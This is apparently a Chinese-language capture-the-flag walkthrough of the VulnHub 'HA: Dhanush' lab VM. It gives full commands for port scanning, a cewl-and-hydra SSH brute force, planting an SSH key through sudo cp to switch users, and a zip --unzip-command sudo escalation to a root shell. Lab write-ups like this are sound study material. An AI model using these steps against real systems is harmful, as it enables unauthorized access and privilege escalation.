# HA: Dhanush

## 环境

虚拟机平台：VMware Workstation Pro

攻击机：Kali（IP：192.168.253.136）

靶机：Dhanush（IP：192.168.253.141）

下载：https://www.vulnhub.com/entry/ha-dhanush,396/

## Let's go

```
nmap -A -p- 192.168.253.141
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-01.png)

> **对网页进行浏览,然而并没有发现任何信息,我们进行枚举**

```
dirb http://192.168.253.141/
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-02.png)

> **然而并没有发现什么有用的信息,因此怀疑是不是跟SSH有关**

```
cewl http://192.168.253.141/ -w 1.txt		# 爬取网站生成字典
hydra -L 1.txt -P 1.txt  -vV -e ns 192.168.253.141 ssh -s 65345
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-03.png)

```
# username:pinak,password:Gandiv
ssh pinak@192.168.253.141 -p 65345
sudo -l
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-04.png)

> **我们需要想办法切换到sarang用户,因此可以使用cp命令将SSH密钥复制到他的.ssh目录中**

```
ssh-keygen
cd .ssh/
chmod 777 id_rsa.pub
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-05.png)

```
cp id_rsa.pub ../
cd ../
sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys
ssh sarang@127.0.0.1 -p 65345
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-06.png)

>**切换到sarang用户,发现root权限的zip命令**

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-07.png)

```
touch get
sudo zip /tmp/get.zip /home/sarang/get -T --unzip-command="sh -c /bin/bash"
cd /root
cat flag.txt
```

![](https://github.com/CHN-Han/Promote/tree/master/VulnHub/img/HA：Dhanush-08.png)